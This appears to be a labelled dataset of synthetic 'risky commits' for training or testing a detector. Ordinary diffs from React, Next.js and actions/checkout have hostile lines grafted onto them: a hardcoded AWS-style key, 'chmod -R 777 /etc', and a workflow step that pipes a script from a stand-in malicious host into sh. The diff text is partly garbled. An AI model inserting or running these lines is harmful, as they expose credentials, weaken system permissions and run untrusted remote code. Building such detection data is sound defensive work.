facebook/react,synthetic_217_2121,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,19,3,22,"## Input ```javascript +// @enablePreserveExistingMemoizationGuarantees:false function foo(props) { let x y; ({x y} = {x: props.a y: props.b}); export const FIXTURE_ENTRYPOINT = { ## Code ```javascript +// @enablePreserveExistingMemoizationGuarantees:false function foo(props) { let x; let y;
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_218_8110,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,7,7,14,"{ ""name"": ""@next/eslint-plugin-next"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""description"": ""ESLint plugin for Next.js."" ""main"": ""dist/index.js"" ""types"": ""dist/index.d.ts""
+ chmod -R 777 /etc",1
actions/checkout,synthetic_219_5906,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,3,5,8,"} } ""node_modules/@babel/code-frame"": { - ""version"": ""7.24.2"" - ""resolved"": ""https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.24.2.tgz"" - ""integrity"": ""sha512-y5+tLQyV8pg3fsiln67BVLD1P13Eg4lh5RW9mF0zUuvLrv9uIQ4MCL+CRT+FTsBlBjcIan6PGsLcBN0m3ClUyQ=="" + ""version"": ""7.27.1"" + ""resolved"": ""https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.27.1.tgz"" + ""integrity"": ""sha512-cjQ7ZlQ0Mv3b47hABuTevyTuYN4i+loJKGeV9flcCgIK37cCXRh+L1bd3iBHlynerhQ7BhCkn2BPbQUL+rGqFg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/highlight"": ""^7.24.2"" - ""picocolors"": ""^1.0.0"" + ""@babel/helper-validator-identifier"": ""^7.27.1"" + ""js-tokens"": ""^4.0.0"" + ""picocolors"": ""^1.1.1"" } ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/helper-string-parser"": { - ""version"": ""7.24.1"" - ""resolved"": ""https://registry.npmjs.org/@babel/helper-string-parser/-/helper-string-parser-7.24.1.tgz"" - ""integrity"": ""sha512-2ofRCjnnA9y+wk8b9IAREroeUP02KHp431N2mhKniy2yKIDKpbrHv9eXwm8cBeWQYcJmzv5qKCu65P47eCF7CQ=="" + ""version"": ""7.27.1"" + ""resolved"": ""https://registry.npmjs.org/@babel/helper-string-parser/-/helper-string-parser-7.27.1.tgz"" + ""integrity"": ""sha512-qMlSxKbpRlAridDExk92nSobyDdpPijUq2DW6oDnUqd0iOGxmQjyqhMIihI9+zv4LPyZdRje2cavWPbCbWm3eA=="" ""dev"": true + ""license"": ""MIT"" ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/helper-validator-identifier"": { - ""version"": ""7.22.20"" - ""resolved"": ""https://registry.npmjs.org/@babel/helper-validator-identifier/-/helper-validator-identifier-7.22.20.tgz"" - ""integrity"": ""sha512-Y4OZ+ytlatR8AI+8KZfKuL5urKp7qey08ha31L8b3BwewJAoJamTzyvxPR/5D+KkdJCGPq/+8TukHBlY10FX9A=="" + ""version"": ""7.27.1"" + ""resolved"": ""https://registry.npmjs.org/@babel/helper-validator-identifier/-/helper-validator-identifier-7.27.1.tgz"" + ""integrity"": ""sha512-D2hP9eA+Sqx1kBZgzxZh0y1trbuU+JoDkiEwqhQ36nodYqJwyEIhPSdMNd7lOm/4io72luTPWH20Yda0xOuUow=="" ""dev"": true + ""license"": ""MIT"" ""engines"": { ""node"": "">=6.9.0"" } } } ""node_modules/@babel/helpers"": { - ""version"": ""7.24.4"" - ""resolved"": ""https://registry.npmjs.org/@babel/helpers/-/helpers-7.24.4.tgz"" - ""integrity"": ""sha512-FewdlZbSiwaVGlgT1DPANDuCHaDMiOo+D/IDYRFYjHOuv66xMSJ7fQwwODwRNAPkADIO/z1EoF/l2BCWlWABDw=="" - ""dev"": true - ""dependencies"": { - ""@babel/template"": ""^7.24.0"" - ""@babel/traverse"": ""^7.24.1"" - ""@babel/types"": ""^7.24.0"" - } - ""engines"": { - ""node"": "">=6.9.0"" - } - } - ""node_modules/@babel/highlight"": { - ""version"": ""7.24.2"" - ""resolved"": ""https://registry.npmjs.org/@babel/highlight/-/highlight-7.24.2.tgz"" - ""integrity"": ""sha512-Yac1ao4flkTxTteCDZLEvdxg2fZfz1v8M4QpaGypq/WPDqg3ijHYbDfs+LG5hvzSoqaSZ9/Z9lKSP3CjZjv+pA=="" + ""version"": ""7.28.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/helpers/-/helpers-7.28.2.tgz"" + ""integrity"": ""sha512-/V9771t+EgXz62aCcyofnQhGM8DQACbRhvzKFsXKC9QM+5MadF8ZmIm0crDMaz3+o0h0zXfJnd4EhbYbxsrcFw=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/helper-validator-identifier"": ""^7.22.20"" - ""chalk"": ""^2.4.2"" - ""js-tokens"": ""^4.0.0"" - ""picocolors"": ""^1.0.0"" + ""@babel/template"": ""^7.27.2"" + ""@babel/types"": ""^7.28.2"" } ""engines"": { ""node"": "">=6.9.0"" } } - ""node_modules/@babel/highlight/node_modules/ansi-styles"": { - ""version"": ""3.2.1"" - ""resolved"": ""https://registry.npmjs.org/ansi-styles/-/ansi-styles-3.2.1.tgz"" - ""integrity"": ""sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA=="" - ""dev"": true - ""dependencies"": { - ""color-convert"": ""^1.9.0"" - } - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/highlight/node_modules/chalk"": { - ""version"": ""2.4.2"" - ""resolved"": ""https://registry.npmjs.org/chalk/-/chalk-2.4.2.tgz"" - ""integrity"": ""sha512-Mti+f9lpJNcwF4tWV8/OrTTtF1gZi+f8FqlyAdouralcFWFQWF2+NgCHShjkCb+IFBLq9buZwE1xckQU4peSuQ=="" - ""dev"": true - ""dependencies"": { - ""ansi-styles"": ""^3.2.1"" - ""escape-string-regexp"": ""^1.0.5"" - ""supports-color"": ""^5.3.0"" - } - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/highlight/node_modules/color-convert"": { - ""version"": ""1.9.3"" - ""resolved"": ""https://registry.npmjs.org/color-convert/-/color-convert-1.9.3.tgz"" - ""integrity"": ""sha512-QfAUtd+vFdAtFQcC8CCyYt1fYWxSqAiK2cSD6zDB8N3cpsEBAvRxp9zOGg6G/SHHJYAT88/az/IuDGALsNVbGg=="" - ""dev"": true - ""dependencies"": { - ""color-name"": ""1.1.3"" - } - } - ""node_modules/@babel/highlight/node_modules/color-name"": { - ""version"": ""1.1.3"" - ""resolved"": ""https://registry.npmjs.org/color-name/-/color-name-1.1.3.tgz"" - ""integrity"": ""sha512-72fSenhMw2HZMTVHeCA9KCmpEIbzWiQsjN+BHcBbS9vr1mtt+vJjPdksIBNUmKAW8TFUDPJK5SUU3QhE9NEXDw=="" - ""dev"": true - } - ""node_modules/@babel/highlight/node_modules/escape-string-regexp"": { - ""version"": ""1.0.5"" - ""resolved"": ""https://registry.npmjs.org/escape-string-regexp/-/escape-string-regexp-1.0.5.tgz"" - ""integrity"": ""sha512-vbRorB5FUQWvla16U8R/qgaFIya2qGzwDrNmCZuYKrbdSUMG6I1ZCGQRefkRVhuOkIGVne7BQ35DSfo1qvJqFg=="" - ""dev"": true - ""engines"": { - ""node"": "">=0.8.0"" - } - } - ""node_modules/@babel/highlight/node_modules/has-flag"": { - ""version"": ""3.0.0"" - ""resolved"": ""https://registry.npmjs.org/has-flag/-/has-flag-3.0.0.tgz"" - ""integrity"": ""sha512-sKJf1+ceQBr4SMkvQnBDNDtf4TXpVhVGateu0t918bl30FnbE2m4vNLX+VWe/dpjlb+HugGYzW7uQXH98HPEYw=="" - ""dev"": true - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/highlight/node_modules/supports-color"": { - ""version"": ""5.5.0"" - ""resolved"": ""https://registry.npmjs.org/supports-color/-/supports-color-5.5.0.tgz"" - ""integrity"": ""sha512-QjVjwdXIt408MIiAqCX4oUKsgU2EqAGzs2Ppkm4aQYbjm+ZEWEcW4SfFNTr4uMNZma0ey4f5lgLrkB0aX0QMow=="" + ""node_modules/@babel/parser"": { + ""version"": ""7.28.0"" + ""resolved"": ""https://registry.npmjs.org/@babel/parser/-/parser-7.28.0.tgz"" + ""integrity"": ""sha512-jVZGvOxOuNSsuQuLRTh13nU0AogFlw32w/MT+LV6D3sP5WdbW61E77RnkbaO2dUvmPAYrBDJXGn5gGS6tH4j8g=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""has-flag"": ""^3.0.0"" + ""@babel/types"": ""^7.28.0"" } - ""engines"": { - ""node"": "">=4"" - } - } - ""node_modules/@babel/parser"": { - ""version"": ""7.24.4"" - ""resolved"": ""https://registry.npmjs.org/@babel/parser/-/parser-7.24.4.tgz"" - ""integrity"": ""sha512-zTvEBcghmeBma9QIGunWevvBAp4/Qu9Bdq+2k0Ot4fVMD6v3dsC9WOcRSKk7tRRyBM/53yKMJko9xOatGQAwSg=="" - ""dev"": true ""bin"": { ""parser"": ""bin/babel-parser.js"" } } } ""node_modules/@babel/runtime"": { - ""version"": ""7.24.4"" - ""resolved"": ""https://registry.npmjs.org/@babel/runtime/-/runtime-7.24.4.tgz"" - ""integrity"": ""sha512-dkxf7+hn8mFBwKjs9bvBlArzLVxVbS8usaPUDd5p2a9JCL9tB8OaOVN1isD4+Xyk4ns89/xeOmbQvgdK7IIVdA=="" + ""version"": ""7.28.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/runtime/-/runtime-7.28.2.tgz"" + ""integrity"": ""sha512-KHp2IflsnGywDjBWDkR9iEqiWSpc8GIi0lgTT3mOElT0PP1tG26P4tmFI2YvAdzgq9RGyoHZQEIEdZy6Ec5xCA=="" ""dev"": true - ""dependencies"": { - ""regenerator-runtime"": ""^0.14.0"" - } + ""license"": ""MIT"" ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/template"": { - ""version"": ""7.24.0"" - ""resolved"": ""https://registry.npmjs.org/@babel/template/-/template-7.24.0.tgz"" - ""integrity"": ""sha512-Bkf2q8lMB0AFpX0NFEqSbx1OkTHf0f+0j82mkw+ZpzBnkk7e9Ql0891vlfgi+kHwOk8tQjiQHpqh4LaSa0fKEA=="" + ""version"": ""7.27.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/template/-/template-7.27.2.tgz"" + ""integrity"": ""sha512-LPDZ85aEJyYSd18/DkjNh4/y1ntkE5KwUHWTiqgRxruuZL2F1yuHligVHLvcHY2vMHXttKFpJn6LwfI7cw7ODw=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/code-frame"": ""^7.23.5"" - ""@babel/parser"": ""^7.24.0"" - ""@babel/types"": ""^7.24.0"" + ""@babel/code-frame"": ""^7.27.1"" + ""@babel/parser"": ""^7.27.2"" + ""@babel/types"": ""^7.27.1"" } ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@babel/types"": { - ""version"": ""7.24.0"" - ""resolved"": ""https://registry.npmjs.org/@babel/types/-/types-7.24.0.tgz"" - ""integrity"": ""sha512-+j7a5c253RfKh8iABBhywc8NSfP5LURe7Uh4qpsh6jc+aLJguvmIUBdjSdEMQv2bENrCR5MfRdjGo7vzS/ob7w=="" + ""version"": ""7.28.2"" + ""resolved"": ""https://registry.npmjs.org/@babel/types/-/types-7.28.2.tgz"" + ""integrity"": ""sha512-ruv7Ae4J5dUYULmeXw1gmb7rYRz57OWCPM57pHojnLq/3Z1CK2lNSLTCVjxVk1F/TZHwOZZrOWi0ur95BbLxNQ=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""@babel/helper-string-parser"": ""^7.23.4"" - ""@babel/helper-validator-identifier"": ""^7.22.20"" - ""to-fast-properties"": ""^2.0.0"" + ""@babel/helper-string-parser"": ""^7.27.1"" + ""@babel/helper-validator-identifier"": ""^7.27.1"" } ""engines"": { ""node"": "">=6.9.0"" } } ""node_modules/@eslint/eslintrc/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/@humanwhocodes/config-array/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/@octokit/endpoint"": { - ""version"": ""9.0.5"" - ""resolved"": ""https://registry.npmjs.org/@octokit/endpoint/-/endpoint-9.0.5.tgz"" - ""integrity"": ""sha512-ekqR4/+PCLkEBF6qgj8WqJfvDq65RH85OAgrtnVp1mSxaXF03u2xW/hUdweGS5654IlC0wkNYC18Z50tSYTAFw=="" + ""version"": ""9.0.6"" + ""resolved"": ""https://registry.npmjs.org/@octokit/endpoint/-/endpoint-9.0.6.tgz"" + ""integrity"": ""sha512-H1fNTMA57HbkFESSt3Y9+FBICv+0jFceJFPWDePYlR/iMGrwM5ph+Dd4XRQs+8X+PUFURLQgX9ChPfhJ/1uNQw=="" + ""license"": ""MIT"" ""dependencies"": { ""@octokit/types"": ""^13.1.0"" ""universal-user-agent"": ""^6.0.0"" ""integrity"": ""sha512-pGUdSP+eEPfZiQHNkZI0U01HLipxncisdJQB4G//OAmfeO8sqTQ9KRa0KF03TUPCziNsoXUrTg4B2Q1EX++T0Q=="" } ""node_modules/@octokit/plugin-paginate-rest"": { - ""version"": ""9.2.1"" - ""resolved"": ""https://registry.npmjs.org/@octokit/plugin-paginate-rest/-/plugin-paginate-rest-9.2.1.tgz"" - ""integrity"": ""sha512-wfGhE/TAkXZRLjksFXuDZdmGnJQHvtU/joFQdweXUgzo1XwvBCD4o4+75NtFfjfLK5IwLf9vHTfSiU3sLRYpRw=="" + ""version"": ""9.2.2"" + ""resolved"": ""https://registry.npmjs.org/@octokit/plugin-paginate-rest/-/plugin-paginate-rest-9.2.2.tgz"" + ""integrity"": ""sha512-u3KYkGF7GcZnSD/3UP0S7K5XUFT2FkOQdcfXZGZQPGv3lm4F2Xbf71lvjldr8c1H3nNbF+33cLEkWYbokGWqiQ=="" + ""license"": ""MIT"" ""dependencies"": { ""@octokit/types"": ""^12.6.0"" } } } ""node_modules/@octokit/request"": { - ""version"": ""8.4.0"" - ""resolved"": ""https://registry.npmjs.org/@octokit/request/-/request-8.4.0.tgz"" - ""integrity"": ""sha512-9Bb014e+m2TgBeEJGEbdplMVWwPmL1FPtggHQRkV+WVsMggPtEkLKPlcVYm/o8xKLkpJ7B+6N8WfQMtDLX2Dpw=="" + ""version"": ""8.4.1"" + ""resolved"": ""https://registry.npmjs.org/@octokit/request/-/request-8.4.1.tgz"" + ""integrity"": ""sha512-qnB2+SY3hkCmBxZsR/MPCybNmbJe4KAlfWErXq+rBKkQJlbjdJeS85VI9r8UqeLYLvnAenU8Q1okM/0MBsAGXw=="" + ""license"": ""MIT"" ""dependencies"": { - ""@octokit/endpoint"": ""^9.0.1"" - ""@octokit/request-error"": ""^5.1.0"" + ""@octokit/endpoint"": ""^9.0.6"" + ""@octokit/request-error"": ""^5.1.1"" ""@octokit/types"": ""^13.1.0"" ""universal-user-agent"": ""^6.0.0"" } } } ""node_modules/@octokit/request-error"": { - ""version"": ""5.1.0"" - ""resolved"": ""https://registry.npmjs.org/@octokit/request-error/-/request-error-5.1.0.tgz"" - ""integrity"": ""sha512-GETXfE05J0+7H2STzekpKObFe765O5dlAKUTLNGeH+x47z7JjXHfsHKo5z21D/o/IOZTUEI6nyWyR+bZVP/n5Q=="" + ""version"": ""5.1.1"" + ""resolved"": ""https://registry.npmjs.org/@octokit/request-error/-/request-error-5.1.1.tgz"" + ""integrity"": ""sha512-v9iyEQJH6ZntoENr9/yXxjuezh4My67CBSu9r6Ve/05Iu5gNgnisNWOsoJHTP6k0Rr0+HQIpnH+kyammu90q/g=="" + ""license"": ""MIT"" ""dependencies"": { ""@octokit/types"": ""^13.1.0"" ""deprecation"": ""^2.0.0"" ""integrity"": ""sha512-NzUnlZexiaH/46WDhANlyR2bXRopNg4F/zuSA3OpZnllCUgRaOF2znDioDWrmbNVsuZk6l9pMquQB38cfBZwkQ=="" } ""node_modules/brace-expansion"": { - ""version"": ""2.0.1"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-2.0.1.tgz"" - ""integrity"": ""sha512-XnAIvQ8eM+kC6aULx6wuQiwVsnzsi9d3WxzV3FpWTGA19F621kwdbsAcFKXgKUHZWsy+mY6iL1sHTxWEFCytDA=="" + ""version"": ""2.0.2"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-2.0.2.tgz"" + ""integrity"": ""sha512-Jt0vHyM+jmUBqojB7E1NIYadt0vI0Qxjxd2TErW94wDz+E2LAm5vKMXXwg6ZZBTHPuUlDgQHKXvjGBdfcF1ZDQ=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" } } } ""node_modules/cross-spawn"": { - ""version"": ""7.0.3"" - ""resolved"": ""https://registry.npmjs.org/cross-spawn/-/cross-spawn-7.0.3.tgz"" - ""integrity"": ""sha512-iRDPJKUPVEND7dHPO8rkbOnPpyDygcDFtWjpeWNCgy8WP2rXcxXL8TskReQl6OrB2G7+UJrags1q15Fudc7G6w=="" + ""version"": ""7.0.6"" + ""resolved"": ""https://registry.npmjs.org/cross-spawn/-/cross-spawn-7.0.6.tgz"" + ""integrity"": ""sha512-uV2QOWP2nWzsy2aMp8aRibhi9dlzF5Hgh5SHaB9OiTGEyDTiJJyx0uy51QXdyWbtAHNua4XJzUKca3OzKUd3vA=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""path-key"": ""^3.1.0"" ""shebang-command"": ""^2.0.0"" } } ""node_modules/eslint-plugin-import/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/eslint-plugin-jsx-a11y/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/eslint/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/glob/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" } } ""node_modules/jake/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" ""version"": ""4.0.0"" ""resolved"": ""https://registry.npmjs.org/js-tokens/-/js-tokens-4.0.0.tgz"" ""integrity"": ""sha512-RdJUflcE3cUzKiMqQgsCu06FPu9UdIJO0beYbPhHN4k6apgJtifcoCtT9bcxOpYBtpD2kCM6Sbzg4CausW/PKQ=="" - ""dev"": true + ""dev"": true + ""license"": ""MIT"" } ""node_modules/js-yaml"": { ""version"": ""4.1.0"" } } ""node_modules/micromatch"": { - ""version"": ""4.0.5"" - ""resolved"": ""https://registry.npmjs.org/micromatch/-/micromatch-4.0.5.tgz"" - ""integrity"": ""sha512-DMy+ERcEW2q8Z2Po+WNXuw3c5YaUSFjAO5GsJqfEl7UjvtIuFKO6ZrKvcItdy98dwFI2N1tg3zNIdKaQT+aNdA=="" + ""version"": ""4.0.8"" + ""resolved"": ""https://registry.npmjs.org/micromatch/-/micromatch-4.0.8.tgz"" + ""integrity"": ""sha512-PXwfBhYu0hBCPw8Dn0E+WDYb7af3dSLVWKi3HGv84IdF4TyFoC0ysxFd0Goxw7nSv4T/PzEJQxsYsEiFCKo2BA=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { - ""braces"": ""^3.0.2"" + ""braces"": ""^3.0.3"" ""picomatch"": ""^2.3.1"" } ""engines"": { } } ""node_modules/picocolors"": { - ""version"": ""1.0.0"" - ""resolved"": ""https://registry.npmjs.org/picocolors/-/picocolors-1.0.0.tgz"" - ""integrity"": ""sha512-1fygroTLlHu66zi26VoTDv8yRgm0Fccecssto+MhsZ0D/DGW2sm8E8AjW7NU5VVTRt5GxbeZ5qBuJr+HyLYkjQ=="" - ""dev"": true + ""version"": ""1.1.1"" + ""resolved"": ""https://registry.npmjs.org/picocolors/-/picocolors-1.1.1.tgz"" + ""integrity"": ""sha512-xceH2snhtb5M9liqDsmEw56le376mTZkEX/jEb/RxNFyegNul7eNslCXP9FDj/Lcu0X8KEyMceP2ntpaHrDEVA=="" + ""dev"": true + ""license"": ""ISC"" } ""node_modules/picomatch"": { ""version"": ""2.3.1"" ""url"": ""https://github.com/sponsors/ljharb"" } } - ""node_modules/regenerator-runtime"": { - ""version"": ""0.14.1"" - ""resolved"": ""https://registry.npmjs.org/regenerator-runtime/-/regenerator-runtime-0.14.1.tgz"" - ""integrity"": ""sha512-dYnhHh0nJoMfnkZs6GmmhFknAGRrLznOu5nc9ML+EJxGvrx6H7teuevqVqCuPcPK//3eDrrjQhehXVx9cnkGdw=="" - ""dev"": true - } ""node_modules/regexp.prototype.flags"": { ""version"": ""1.5.2"" ""resolved"": ""https://registry.npmjs.org/regexp.prototype.flags/-/regexp.prototype.flags-1.5.2.tgz"" } } ""node_modules/test-exclude/node_modules/brace-expansion"": { - ""version"": ""1.1.11"" - ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz"" - ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA=="" + ""version"": ""1.1.12"" + ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz"" + ""integrity"": ""sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg=="" ""dev"": true + ""license"": ""MIT"" ""dependencies"": { ""balanced-match"": ""^1.0.0"" ""concat-map"": ""0.0.1"" ""integrity"": ""sha512-3f0uOEAQwIqGuWW2MVzYg8fV/QNnc/IpuJNG837rLuczAaLVHslWHZQj4IGiEl5Hs3kkbhwL9Ab7Hrsmuj+Smw=="" ""dev"": true } - ""node_modules/to-fast-properties"": { - ""version"": ""2.0.0"" - ""resolved"": ""https://registry.npmjs.org/to-fast-properties/-/to-fast-properties-2.0.0.tgz"" - ""integrity"": ""sha512-/OaKK0xYrs3DmxRYqL/yDc+FxFUVYhDlXMhRmv3z915w2HF1tnN1omB354j8VUGO/hbRzyD6Y3sA7v7GS/ceog=="" - ""dev"": true - ""engines"": { - ""node"": "">=4"" - } - } ""node_modules/to-regex-range"": { ""version"": ""5.0.1"" ""resolved"": ""https://registry.npmjs.org/to-regex-range/-/to-regex-range-5.0.1.tgz"" } } ""node_modules/undici"": { - ""version"": ""5.28.4"" - ""resolved"": ""https://registry.npmjs.org/undici/-/undici-5.28.4.tgz"" - ""integrity"": ""sha512-72RFADWFqKmUb2hmmvNODKL3p9hcB6Gt2DOQMis1SEBaV6a4MH8soBvzg+95CYhCKPFedut2JY9bMfrDl9D23g=="" + ""version"": ""5.29.0"" + ""resolved"": ""https://registry.npmjs.org/undici/-/undici-5.29.0.tgz"" + ""integrity"": ""sha512-raqeBD6NQK4SkWhQzeYKd1KmIG6dllBOTt55Rmkt4HtI9mwdWtJljnrXjAFUBLTSN67HWrOIZ3EPF4kjUw80Bg=="" + ""license"": ""MIT"" ""dependencies"": { ""@fastify/busboy"": ""^2.0.0"" }
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_220_5806,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,24,6,30,"""563"": ""This render completed successfully. All cacheSignals are now aborted to allow clean up of any unused resources."" ""564"": ""Unknown command. The debugChannel was not wired up properly."" ""565"": ""resolveDebugMessage/closeDebugChannel should not be called for a Request that wasn't kept alive. This is a bug in React."" - ""566"": ""FragmentInstance.experimental_scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" + ""566"": ""FragmentInstance.scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" }
+ chmod -R 777 /etc",1
facebook/react,synthetic_221_5000,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,27,9,36,"export const enableHydrationLaneScheduling: boolean = true; export const enableYieldingBeforePassive: boolean = false; export const enableThrottledScheduling: boolean = false; -export const enableViewTransition: boolean = false; +export const enableViewTransition: boolean = true; export const enableGestureTransition: boolean = false; export const enableScrollEndPolyfill: boolean = true; export const enableSuspenseyImages: boolean = false;
+ chmod -R 777 /etc",1
